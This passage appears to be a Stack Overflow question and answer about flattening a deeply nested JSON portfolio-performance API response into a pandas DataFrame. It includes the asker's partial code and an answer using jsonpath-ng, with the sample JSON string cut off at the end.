                                                &quot;time_weighted_return&quot;: -0.030370390035505124,
                                                &quot;time_weighted_return_2&quot;: -0.030370390035505124,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 114472.68744000001
                                            },
                                            &quot;children&quot;: []
                                        },
                                        {
                                            &quot;entity_id&quot;: 10643052,
                                            &quot;name&quot;: &quot;2013 Irrev Tr HBO Thalia&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: 0,
                                                &quot;time_weighted_return_2&quot;: 0,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 0.01
                                            },
                                            &quot;children&quot;: []
                                        }
                                    ]
                                },
                                {
                                    &quot;name&quot;: &quot;Asset Class D&quot;,
                                    &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;,
                                    &quot;columns&quot;: {
                                        &quot;time_weighted_return&quot;: -0.06604362523792162,
                                        &quot;time_weighted_return_2&quot;: -0.06604362523792162,
                                        &quot;_custom_twr_audit_note_911328&quot;: null,
                                        &quot;value&quot;: 5722529.229999997
                                    },
                                    &quot;children&quot;: [{
                                            &quot;entity_id&quot;: 10868778,
                                            &quot;name&quot;: &quot;2012 Desc Tr HBO Thalia&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: -0.06154960593668424,
                                                &quot;time_weighted_return_2&quot;: -0.06154960593668424,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 1191838.9399999995
                                            },
                                            &quot;children&quot;: []
                                        },
                                        {
                                            &quot;entity_id&quot;: 10643052,
                                            &quot;name&quot;: &quot;2013 Irrev Tr HBO Thalia&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: -0.06750460387418267,
                                                &quot;time_weighted_return_2&quot;: -0.06750460387418267,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 4416618.520000002
                                            },
                                            &quot;children&quot;: []
                                        },
                                        {
                                            &quot;entity_id&quot;: 10598341,
                                            &quot;name&quot;: &quot;Cht 11th Tr HBO Shirley&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: -0.05604507809250081,
                                                &quot;time_weighted_return_2&quot;: -0.05604507809250081,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 38190.33
                                            },
                                            &quot;children&quot;: []
                                        },
                                        {
                                            &quot;entity_id&quot;: 10598337,
                                            &quot;name&quot;: &quot;Cht 11th Tr HBO Hannah&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: -0.05604507809250081,
                                                &quot;time_weighted_return_2&quot;: -0.05604507809250081,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 37940.72
                                            },
                                            &quot;children&quot;: []
                                        },
                                        {
                                            &quot;entity_id&quot;: 10598334,
                                            &quot;name&quot;: &quot;Cht 11th Tr HBO Lau&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: -0.05604507809250081,
                                                &quot;time_weighted_return_2&quot;: -0.05604507809250081,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 37940.72
                                            },
                                            &quot;children&quot;: []
                                        }
                                    ]
                                },
                                {
                                    &quot;name&quot;: &quot;Asset Class E&quot;,
                                    &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;,
                                    &quot;columns&quot;: {
                                        &quot;time_weighted_return&quot;: -0.017118805423322003,
                                        &quot;time_weighted_return_2&quot;: -0.017118805423322003,
                                        &quot;_custom_twr_audit_note_911328&quot;: null,
                                        &quot;value&quot;: 3148495.0914600003
                                    },
                                    &quot;children&quot;: [{
                                            &quot;entity_id&quot;: 10868778,
                                            &quot;name&quot;: &quot;2012 Desc Tr HBO Thalia&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: -0.015251157805867277,
                                                &quot;time_weighted_return_2&quot;: -0.015251157805867277,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 800493.06146
                                            },
                                            &quot;children&quot;: []
                                        },
                                        {
                                            &quot;entity_id&quot;: 10643052,
                                            &quot;name&quot;: &quot;2013 Irrev Tr HBO Thalia&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: -0.01739609576880241,
                                                &quot;time_weighted_return_2&quot;: -0.01739609576880241,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 2215511.2700000005
                                            },
                                            &quot;children&quot;: []
                                        },
                                        {
                                            &quot;entity_id&quot;: 10598341,
                                            &quot;name&quot;: &quot;Cht 11th Tr HBO Shirley&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: -0.02085132265594647,
                                                &quot;time_weighted_return_2&quot;: -0.02085132265594647,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 44031.21
                                            },
                                            &quot;children&quot;: []
                                        },
                                        {
                                            &quot;entity_id&quot;: 10598337,
                                            &quot;name&quot;: &quot;Cht 11th Tr HBO Hannah&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: -0.02089393244695803,
                                                &quot;time_weighted_return_2&quot;: -0.02089393244695803,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 44394.159999999996
                                            },
                                            &quot;children&quot;: []
                                        },
                                        {
                                            &quot;entity_id&quot;: 10598334,
                                            &quot;name&quot;: &quot;Cht 11th Tr HBO Lau&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: -0.020607507059866248,
                                                &quot;time_weighted_return_2&quot;: -0.020607507059866248,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 44065.39000000001
                                            },
                                            &quot;children&quot;: []
                                        }
                                    ]
                                },
                                {
                                    &quot;name&quot;: &quot;Asset Class F&quot;,
                                    &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;,
                                    &quot;columns&quot;: {
                                        &quot;time_weighted_return&quot;: -0.0014710489231547497,
                                        &quot;time_weighted_return_2&quot;: -0.0014710489231547497,
                                        &quot;_custom_twr_audit_note_911328&quot;: null,
                                        &quot;value&quot;: 198260.12
                                    },
                                    &quot;children&quot;: [{
                                            &quot;entity_id&quot;: 10868778,
                                            &quot;name&quot;: &quot;2012 Desc Tr HBO Thalia&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: -0.0014477244560456848,
                                                &quot;time_weighted_return_2&quot;: -0.0014477244560456848,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 44612.33
                                            },
                                            &quot;children&quot;: []
                                        },
                                        {
                                            &quot;entity_id&quot;: 10643052,
                                            &quot;name&quot;: &quot;2013 Irrev Tr HBO Thalia&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: -0.001477821083437858,
                                                &quot;time_weighted_return_2&quot;: -0.001477821083437858,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 153647.78999999998
                                            },
                                            &quot;children&quot;: []
                                        }
                                    ]
                                }
                            ]
                        }
                    ]
                }]
            }
        },
        &quot;included&quot;: []
    }
}
</code></pre>
<p><strong>Notes on JSON Object extract</strong><br></p>
<ol>
<li><code>data</code> - data in here can be ignored, these are aggregated values for underlying children.</li>
<li><code>meta</code> - <code>columns</code> – contains the column header values I want to use for each applicable <code>children</code> ‘column` key:pair values.</li>
<li><code>groupings</code> - can be ignored.</li>
<li><code>children</code> hierarchy – there are 4x levels of <code>children</code> which can be identified by their <code>name</code> as follows –
<ul>
<li>Family <code>name</code> (i.e., ‘Falconer Family’)</li>
<li>Wealth Bucket <code>name</code> (e.g., ‘Wealth Bucket A’)</li>
<li>Asset Class <code>name</code> (e.g., ‘Asset Class A’)</li>
<li>Fund <code>name</code> (e.g., ‘HUDJ Trust’)</li>
</ul>
</li>
</ol>
<p><strong>Target Output</strong><br>this is an extract of target <code>df</code> structure I am trying to achieve -</p>
<div class=""s-table-container"">
<table class=""s-table"">
<thead>
<tr>
<th><strong>portfolio</strong></th>
<th><strong>name</strong></th>
<th><strong>entity_id</strong></th>
<th><strong>Adjusted Value (No Div, USD)</strong></th>
<th><strong>Current Quarter TWR (USD)</strong></th>
<th><strong>YTD TWR (USD)</strong></th>
<th><strong>TWR Audit Note</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Falconer Family</td>
<td>Falconer Family</td>
<td></td>
<td>23132492.90510712</td>
<td>-0.046732301295604683</td>
<td>-0.046732301295604683</td>
<td>None</td>
</tr>
<tr>
<td>Falconer Family</td>
<td>Wealth Bucket A</td>
<td></td>
<td>13264448.506587146</td>
<td>-0.045960317420568164</td>
<td>-0.045960317420568164</td>
<td>None</td>
</tr>
<tr>
<td>Falconer Family</td>
<td>Asset Class A</td>
<td></td>
<td>3337.99</td>
<td>0.000003434094574039648</td>
<td>0.000003434094574039648</td>
<td>None</td>
</tr>
<tr>
<td>Falconer Family</td>
<td>HUDJ Trust</td>
<td>10604454</td>
<td>3337.99</td>
<td>0.000003434094574039648</td>
<td>0.000003434094574039648</td>
<td>None</td>
</tr>
<tr>
<td>Falconer Family</td>
<td>Asset Class B</td>
<td></td>
<td>1017004.7192636987</td>
<td>-0.025871339096964152</td>
<td>-0.025871339096964152</td>
<td>None</td>
</tr>
<tr>
<td>Falconer Family</td>
<td>HUDG Trust</td>
<td>10604454</td>
<td>1017004.7192636987</td>
<td>-0.025871339096964152</td>
<td>-0.025871339096964152</td>
<td>None</td>
</tr>
<tr>
<td>Falconer Family</td>
<td>Asset Class C</td>
<td></td>
<td>231142.67772000004</td>
<td>-0.030370376329670656</td>
<td>-0.030370376329670656</td>
<td>None</td>
</tr>
<tr>
<td>Falconer Family</td>
<td>HKDJ Trust</td>
<td>10604454</td>
<td>231142.67772000004</td>
<td>-0.030370376329670656</td>
<td>-0.030370376329670656</td>
<td>None</td>
</tr>
<tr>
<td>Falconer Family</td>
<td>Asset Class D</td>
<td></td>
<td>9791282.570000006</td>
<td>-0.05382756475465478</td>
<td>-0.05382756475465478</td>
<td>None</td>
</tr>
<tr>
<td>Falconer Family</td>
<td>HUDW Trust</td>
<td>10604454</td>
<td>9791282.570000006</td>
<td>-0.05382756475465478</td>
<td>-0.05382756475465478</td>
<td>None</td>
</tr>
</tbody>
</table>
</div>
<p><strong>Notes on Target Output</strong><br></p>
<ol>
<li>Portfolio header – for every row, I would like to map the top-level <code>children</code> <code>name</code> value [family name]. E.g., ‘Falconer Family.</li>
<li>Name header – this should simply be the <code>name</code> value from each respective <code>children</code>.</li>
<li>Entity ID – all 4th level <code>children</code> <code>entity_id</code> value should be mapped to this column.</li>
<li>Data columns – regardless of level, all <code>children</code> have identical <code>time_weighted_return</code>, <code>time-weighted_return2</code> and <code>value</code> columns which should be mapped respectively.</li>
<li>TWR Audit Note – these <code>children</code> <code>_custom_twr_audit_note_911318</code> values are currently blank, but will be utilized in the future.</li>
</ol>
<p><strong>Current Output</strong><br>My main issue is that you can see that I have only been able to tap into the 1st [Family] and 2nd [Wealth Bucket] <code>children</code> level. This leaves me missing the 3rd [Asset Class] and 4th [Fund] -</p>
<div class=""s-table-container"">
<table class=""s-table"">
<thead>
<tr>
<th></th>
<th><strong>portfolio</strong></th>
<th><strong>name</strong></th>
<th><strong>Adjusted Value (No Div, USD)</strong></th>
<th><strong>Current Quarter TWR (USD)</strong></th>
<th><strong>YTD TWR (USD)</strong></th>
<th><strong>TWR Audit Note)</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>Falconer Family</td>
<td>Falconer Family</td>
<td>2.313249e+07</td>
<td>-0.046732</td>
<td>-0.046732</td>
<td>None</td>
</tr>
<tr>
<td>1</td>
<td>Falconer Family</td>
<td>Wealth Bucket A</td>
<td>1.326445e+07</td>
<td>-0.045960</td>
<td>-0.045960</td>
<td>None</td>
</tr>
<tr>
<td>2</td>
<td>Falconer Family</td>
<td>Wealth Bucket B</td>
<td>9.868044e+06</td>
<td>-0.047699</td>
<td>-0.047699</td>
<td>None</td>
</tr>
</tbody>
</table>
</div>
<p><strong>Current code</strong><br>This is a function which gets me the correct <code>df</code> formatting, however my main issue is that I haven't been able to find a solution to returning all children, but rather only the top-level -</p>
<pre><code># Function to read API response / JSON Object
def response_writer():
    with open('api_response_2022-02-13.json') as f:
        api_response = json.load(f)
        return api_response

# Function to unpack JSON response into pandas dataframe.
def unpack_response():
    while True:
        try:
            api_response = response_writer()
            portfolio_views_children = api_response['data']['attributes']['total']['children']
            portfolios = []
            for portfolio in portfolio_views_children:
                entity_columns = []
                # include portfolio itself within an iterable so the total is the header
                for entity in itertools.chain([portfolio], portfolio[&quot;children&quot;]):
                    entity_data = entity[&quot;columns&quot;].copy()  # don't mutate original response
                    entity_data[&quot;portfolio&quot;] = portfolio[&quot;name&quot;]   # from outer
                    entity_data[&quot;name&quot;]      = entity[&quot;name&quot;]
                    entity_columns.append(entity_data)

                df = pd.DataFrame(entity_columns)
                portfolios.append(df)

            # combine dataframes
            df = pd.concat(portfolios)
            # reorder and rename
            column_ordering = {&quot;portfolio&quot;: &quot;portfolio&quot;, &quot;name&quot;: &quot;name&quot;}
            column_ordering.update({c[&quot;key&quot;]: c[&quot;display_name&quot;] for c in api_response[&quot;meta&quot;][&quot;columns&quot;]})
            df = df[column_ordering.keys()]   # beware: un-named cols will be dropped
            df = df.rename(columns=column_ordering)
            break
        except KeyError:
            print(&quot;-----------------------------------\n&quot;,&quot;API TIMEOUT ERROR: TRY AGAIN...&quot;, &quot;\n-----------------------------------\n&quot;)
    return df
unpack_response()
</code></pre>
<p><strong>Help</strong><br>In short, I am looking for some advice on how I can tap into the remaining <code>children</code> by enhancing the existing code. Whilst I have taken much time to fully explain my problem, please ask if anything isn't clear. Please note that the JSON may have multiple families, so the solution / advice offered must observe this</p>
","71136605","<p><a href=""https://github.com/h2non/jsonpath-ng"" rel=""nofollow noreferrer""><code>jsonpath-ng</code></a> can parse even such a nested json object very easily. You can install this convenient library by the following command:</p>
<pre class=""lang-sh prettyprint-override""><code>pip install --upgrade jsonpath-ng
</code></pre>
<h2>Code:</h2>
<pre class=""lang-py prettyprint-override""><code>import json
import jsonpath_ng as jp
import pandas as pd

def unpack_response(r):
    # Create a dataframe from extracted data
    expr = jp.parse('$..children.[*]')
    data = [{'full_path': str(m.full_path), **m.value} for m in expr.find(r)]
    df = pd.json_normalize(data).sort_values('full_path', ignore_index=True)

    # Append a portfolio column
    df['portfolio'] = df.loc[df.full_path.str.contains(r'total\.children\.\[\d+]$'), 'name']
    df['portfolio'].fillna(method='ffill', inplace=True)

    # Deal with columns
    trans = {'columns.' + c['key']: c['display_name'] for c in r['meta']['columns']}
    cols = ['full_path', 'portfolio', 'name', 'entity_id', 'Adjusted Value (No Div, USD)', 'Current Quarter TWR (USD)', 'YTD TWR (USD)', 'TWR Audit Note']
    df = df.rename(columns=trans)[cols]

    return df

# Load the sample data from file
# with open('api_response_2022-02-13.json', 'r') as f:
#     api_response = json.load(f)

# Load the sample data from string
api_response = json.loads('{&quot;meta&quot;: {&quot;columns&quot;: [{&quot;key&quot;: &quot;value&quot;, &quot;display_name&quot;: &quot;Adjusted Value (No Div, USD)&quot;, &quot;output_type&quot;: &quot;Number&quot;, &quot;currency&quot;: &quot;USD&quot;}, {&quot;key&quot;: &quot;time_weighted_return&quot;, &quot;display_name&quot;: &quot;Current Quarter TWR (USD)&quot;, &quot;output_type&quot;: &quot;Percent&quot;, &quot;currency&quot;: &quot;USD&quot;}, {&quot;key&quot;: &quot;time_weighted_return_2&quot;, &quot;display_name&quot;: &quot;YTD TWR (USD)&quot;, &quot;output_type&quot;: &quot;Percent&quot;, &quot;currency&quot;: &quot;USD&quot;}, {&quot;key&quot;: &quot;_custom_twr_audit_note_911328&quot;, &quot;display_name&quot;: &quot;TWR Audit Note&quot;, &quot;output_type&quot;: &quot;Word&quot;}], &quot;groupings&quot;: [{&quot;key&quot;: &quot;_custom_name_747205&quot;, &quot;display_name&quot;: &quot;* Reporting Client Name&quot;}, {&quot;key&quot;: &quot;_custom_new_entity_group_453577&quot;, &quot;display_name&quot;: &quot;NEW Entity Group&quot;}, {&quot;key&quot;: &quot;_custom_level_2_624287&quot;, &quot;display_name&quot;: &quot;* Level 2&quot;}, {&quot;key&quot;: &quot;legal_entity&quot;, &quot;display_name&quot;: &quot;Legal Entity&quot;}]}, &quot;data&quot;: {&quot;type&quot;: &quot;portfolio_views&quot;, &quot;attributes&quot;: {&quot;total&quot;: {&quot;name&quot;: &quot;Total&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.046732301295604683, &quot;time_weighted_return_2&quot;: -0.046732301295604683, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 23132492.905107163}, &quot;children&quot;: [{&quot;name&quot;: &quot;Falconer Family&quot;, &quot;grouping&quot;: &quot;_custom_name_747205&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.046732301295604683, &quot;time_weighted_return_2&quot;: -0.046732301295604683, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 23132492.905107163}, &quot;children&quot;: [{&quot;name&quot;: &quot;Wealth Bucket A&quot;, &quot;grouping&quot;: &quot;_custom_new_entity_group_453577&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.045960317420568164, &quot;time_weighted_return_2&quot;: -0.045960317420568164, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 13264448.506587159}, &quot;children&quot;: [{&quot;name&quot;: &quot;Asset Class A&quot;, &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: 3.434094574039648e-06, &quot;time_weighted_return_2&quot;: 3.434094574039648e-06, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 3337.99}, &quot;children&quot;: [{&quot;entity_id&quot;: 10604454, &quot;name&quot;: &quot;HUDJ Trust&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: 3.434094574039648e-06, &quot;time_weighted_return_2&quot;: 3.434094574039648e-06, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 3337.99}, &quot;children&quot;: []}]}, {&quot;name&quot;: &quot;Asset Class B&quot;, &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.025871339096964152, &quot;time_weighted_return_2&quot;: -0.025871339096964152, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 1017004.7192636987}, &quot;children&quot;: [{&quot;entity_id&quot;: 10604454, &quot;name&quot;: &quot;HUDG Trust&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.025871339096964152, &quot;time_weighted_return_2&quot;: -0.025871339096964152, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 1017004.7192636987}, &quot;children&quot;: []}]}, {&quot;name&quot;: &quot;Asset Class C&quot;, &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.030370376329670656, &quot;time_weighted_return_2&quot;: -0.030370376329670656, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 231142.67772000004}, &quot;children&quot;: [{&quot;entity_id&quot;: 10604454, &quot;name&quot;: &quot;HKDJ Trust&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.030370376329670656, &quot;time_weighted_return_2&quot;: -0.030370376329670656, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 231142.67772000004}, &quot;children&quot;: []}]}, {&quot;name&quot;: &quot;Asset Class D&quot;, &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.05382756475465478, &quot;time_weighted_return_2&quot;: -0.05382756475465478, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 9791282.570000006}, &quot;children&quot;: [{&quot;entity_id&quot;: 10604454, &quot;name&quot;: &quot;HUDW Trust&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.05382756475465478, &quot;time_weighted_return_2&quot;: -0.05382756475465478, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 9791282.570000006}, &quot;children&quot;: []}]}, {&quot;name&quot;: &quot;Asset Class E&quot;, &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.01351630404081805, &quot;time_weighted_return_2&quot;: -0.01351630404081805, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 2153366.6396034593}, &quot;children&quot;: [{&quot;entity_id&quot;: 10604454, &quot;name&quot;: &quot;HJDJ Trust&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.01351630404081805, &quot;time_weighted_return_2&quot;: -0.01351630404081805, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 2153366.6396034593}, &quot;children&quot;: []}]}, {&quot;name&quot;: &quot;Asset Class F&quot;, &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.002298190175237247, &quot;time_weighted_return_2&quot;: -0.002298190175237247, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 68313.90999999999}, &quot;children&quot;: [{&quot;entity_id&quot;: 10604454, &quot;name&quot;: &quot;HADJ Trust&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.002298190175237247, &quot;time_weighted_return_2&quot;: -0.002298190175237247, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 68313.90999999999}, &quot;children&quot;: []}]}]}, {&quot;name&quot;: &quot;Wealth Bucket B&quot;, &quot;grouping&quot;: &quot;_custom_new_entity_group_453577&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.04769870075659244, &quot;time_weighted_return_2&quot;: -0.04769870075659244, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 9868044.398519998}, &quot;children&quot;: [{&quot;name&quot;: &quot;Asset Class A&quot;, &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: 2.8632718065191298e-05, &quot;time_weighted_return_2&quot;: 2.8632718065191298e-05, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 10234.94}, &quot;children&quot;: [{&quot;entity_id&quot;: 10868778, &quot;name&quot;: &quot;2012 Desc Tr HBO Thalia&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: 2.82679297198829e-05, &quot;time_weighted_return_2&quot;: 2.82679297198829e-05, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 244.28}, &quot;children&quot;: []}, {&quot;entity_id&quot;: 10643052, &quot;name&quot;: &quot;2013 Irrev Tr HBO Thalia&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: 4.9373572795108345e-05, &quot;time_weighted_return_2&quot;: 4.9373572795108345e-05, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 5081.08}, &quot;children&quot;: []}, {&quot;entity_id&quot;: 10598341, &quot;name&quot;: &quot;Cht 11th Tr HBO Shirley&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: 6.609603754315074e-06, &quot;time_weighted_return_2&quot;: 6.609603754315074e-06, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 1523.62}, &quot;children&quot;: []}, {&quot;entity_id&quot;: 10598337, &quot;name&quot;: &quot;Cht 11th Tr HBO Hannah&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: 1.0999769004760296e-05, &quot;time_weighted_return_2&quot;: 1.0999769004760296e-05, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 1828.9}, &quot;children&quot;: []}, {&quot;entity_id&quot;: 10598334, &quot;name&quot;: &quot;Cht 11th Tr HBO Lau&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: 6.466673995619843e-06, &quot;time_weighted_return_2&quot;: 6.466673995619843e-06, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 1557.06}, &quot;children&quot;: []}]}, {&quot;name&quot;: &quot;Asset Class B&quot;, &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.024645947842438676, &quot;time_weighted_return_2&quot;: -0.024645947842438676, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 674052.31962}, &quot;children&quot;: [{&quot;entity_id&quot;: 10868778, &quot;name&quot;: &quot;2012 Desc Tr HBO Thalia&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.043304004172576405, &quot;time_weighted_return_2&quot;: -0.043304004172576405, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 52800.96}, &quot;children&quot;: []}, {&quot;entity_id&quot;: 10643052, &quot;name&quot;: &quot;2013 Irrev Tr HBO Thalia&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.022408434778798836, &quot;time_weighted_return_2&quot;: -0.022408434778798836, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 599594.11962}, &quot;children&quot;: []}, {&quot;entity_id&quot;: 10598341, &quot;name&quot;: &quot;Cht 11th Tr HBO Shirley&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.039799855483646174, &quot;time_weighted_return_2&quot;: -0.039799855483646174, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 7219.08}, &quot;children&quot;: []}, {&quot;entity_id&quot;: 10598337, &quot;name&quot;: &quot;Cht 11th Tr HBO Hannah&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.039799855483646174, &quot;time_weighted_return_2&quot;: -0.039799855483646174, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 7219.08}, &quot;children&quot;: []}, {&quot;entity_id&quot;: 10598334, &quot;name&quot;: &quot;Cht 11th Tr HBO Lau&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.039799855483646174, &quot;time_weighted_return_2&quot;: -0.039799855483646174, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 7219.08}, &quot;children&quot;: []}]}, {&quot;name&quot;: &quot;Asset Class C&quot;, &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.03037038746301135, &quot;time_weighted_return_2&quot;: -0.03037038746301135, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 114472.69744}, &quot;children&quot;: [{&quot;entity_id&quot;: 10868778, &quot;name&quot;: &quot;2012 Desc Tr HBO Thalia&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.030370390035505124, &quot;time_weighted_return_2&quot;: -0.030370390035505124, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 114472.68744000001}, &quot;children&quot;: []}, {&quot;entity_id&quot;: 10643052, &quot;name&quot;: &quot;2013 Irrev Tr HBO Thalia&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: 0, &quot;time_weighted_return_2&quot;: 0, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 0.01}, &quot;children&quot;: []}]}, {&quot;name&quot;: &quot;Asset Class D&quot;, &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;, &quot;columns&quot;: {&quot;time_weighted_return&quot;: -0.06604362523792162, &quot;time_weighted_return_2&quot;: -0.06604362523792162, &quot;_custom_twr_audit_note_911328&quot;: null, &quot;value&quot;: 5722529.229999997}, &quot;children&quot;: [{&quot;entity_id&quot;: 10868778, &quot;name&quot;: &quot;2012 Desc Tr HBO Thalia&quot;, &quot;grouping&quot;: &quot;legal_entity&quot;, &quot;columns&quot;: 